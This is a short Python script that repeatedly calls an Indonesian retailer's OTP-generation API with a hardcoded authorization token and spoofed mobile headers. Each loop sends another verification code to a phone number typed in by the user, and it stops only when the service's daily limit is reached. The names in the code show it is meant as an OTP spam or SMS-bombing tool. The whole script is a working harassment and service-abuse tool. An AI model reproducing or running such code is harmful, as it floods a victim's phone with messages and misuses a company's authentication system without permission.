import os,sys,time,json,requests

if sys.platform in ['nt','win32']:
	W = ''
	G = ''
	R = ''
	B = ''
	Y = ''
	C = ''
	L = ''
else:
	W = '\033[0m'
	R = '\033[91m'
	G = '\033[92m'
	Y = '\033[93m'
	B = '\033[94m'
	L = '\023[95m'
	C = '\033[96m'

head = {
	'Host':'wapi.ruparupa.com',
	'authorization':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiMDFmMTYyNTEtMzM0Ni00MmRiLWI0MDItODMxY2FmNjA2ZjljIiwiaWF0IjoxNTgxMDA3NTg0LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.vJ7uUcys74Ju8CnM692kQBxUgJMKfGd2rIyGivOnvxM',
	'content-type':'application/json',
	'x-company-name':'odi',
	'accept':'application/json',
	'user-agent':'Mozilla/5.0 (Linux; Android 9; RMX1911) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36',
	'user-platform':'mobile',
	'x-frontend-type':'mobile',
	'origin':'https://m.ruparupa.com',
	'sec-fetch-site':'same-site',
	'sec-fetch-mode':'cors',
	'referer':'https://m.ruparupa.com/verification?page=otp-choices',
	'accept-encoding':'gzip, deflate, br',
	'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
}
class nyepam:
	def __init__(self,nomor):
		self.nomor = nomor
		print()
		self.jancok()
	def jancok(self):
		i = 0
		while True:
			r = requests.post('https://wapi.ruparupa.com/auth/generate-otp',headers=head,json={
				"phone":self.nomor,
				"action":"register",
				"channel":"chat",
				"email":"",
				"customer_id":"0",
				"is_resend":'0'
			})
			js = json.loads(r.text)
			if 'success' in js['message'] :
				i+=1
				print (f'{W}[{G}{i}{W}] sukses terkirim ke {L}{self.nomor}{W}')
				time.sleep(1)
			elif 'Permintaan kode otp sudah mencapai batas, silakan tunggu 1x24 jam' in js['message']:
				exit(f"{W}[{B}*{W}] {R}"+js['message']+W)
			else:
				print (js)
while True:
	try:
		nomor = input(f'{C}[+]{W} No Hp : ')
		if nomor == '':
			break
		nyepam(nomor)
		exit()
	except KeyboardInterrupt:
		exit('\n')
